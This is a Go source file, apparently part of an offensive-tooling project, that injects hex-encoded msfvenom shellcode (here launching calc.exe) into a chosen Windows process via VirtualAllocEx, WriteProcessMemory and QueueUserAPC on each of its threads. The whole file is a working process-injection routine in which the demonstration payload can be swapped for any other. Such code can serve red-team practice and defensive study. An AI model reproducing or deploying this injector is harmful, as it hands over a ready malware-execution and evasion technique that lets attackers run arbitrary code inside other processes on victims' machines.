package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"go-inject/inject"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {

	tPid := flag.Int("pid", 0, "target pid")
	flag.Parse()

	// msfvenom -p windows/x64/exec CMD=calc.exe -f hex
	var payload string = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500"

	sc, err := hex.DecodeString(payload)
	if err != nil {
		fmt.Printf("\nError decoding shellcode: %s\n", err)
		os.Exit(1)
	}

	// HEAP_CREATE_ENABLE_EXECUTE - 0x00040000
	snapshot := inject.CreateToolhelp32Snapshot(inject.TH32CS_SNAPPROCESS|inject.TH32CS_SNAPTHREAD, 0)

	var processEntry windows.ProcessEntry32
	processEntry.Size = uint32(unsafe.Sizeof(processEntry))
	_, err = inject.Process32Next(snapshot, &processEntry)
	if err != nil && err.Error() != inject.SUCCESS {
		fmt.Println(err)
	}

	for true {
		if processEntry.ProcessID == uint32(*tPid) {
			break
		}
		_, err = inject.Process32Next(snapshot, &processEntry)
		if err.Error() == inject.ERROR_NO_MORE_FILES {
			break
		}
	}

	processHandle, err := inject.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, uint32(*tPid))
	if err != nil && err.Error() != inject.SUCCESS {
		fmt.Println(err)
	}

	memptr := inject.VirtualAllocEx(processHandle, uintptr(0), len(sc), 0x3000, 0x40)

	inject.WriteProcessMemory(processHandle, memptr, sc)

	var threadEntry windows.ThreadEntry32
	threadEntry.Size = uint32(unsafe.Sizeof(threadEntry))
	_, err = inject.Thread32First(snapshot, &threadEntry)
	if err != nil && err.Error() != inject.SUCCESS {
		fmt.Println(err)
	}

	allThreads := []windows.ThreadEntry32{}
	for true {
		if threadEntry.OwnerProcessID > 0 {
			fmt.Printf("Owning PID %d looking for %d\n", threadEntry.OwnerProcessID, uint32(*tPid))
			if uint32(*tPid) == threadEntry.OwnerProcessID {
				allThreads = append(allThreads, threadEntry)
			}
		}
		threadEntry.Size = uint32(unsafe.Sizeof(threadEntry))
		_, err = inject.Thread32Next(snapshot, &threadEntry)
		if err.Error() == inject.ERROR_NO_MORE_FILES {
			break
		}
	}

	for _, thread := range allThreads {
		if thread.ThreadID > 0 {
			fmt.Printf("PID: %d, TID: %d\n", thread.OwnerProcessID, thread.ThreadID)
			tHandle, err := inject.OpenThread(inject.THREAD_ALL_ACCESS, 1, thread.ThreadID)
			if err != nil && err.Error() != inject.SUCCESS {
				fmt.Println(err)
			}
			inject.QueueUserAPC(&memptr, tHandle)
			time.Sleep(2 * time.Second)
		}
	}
}
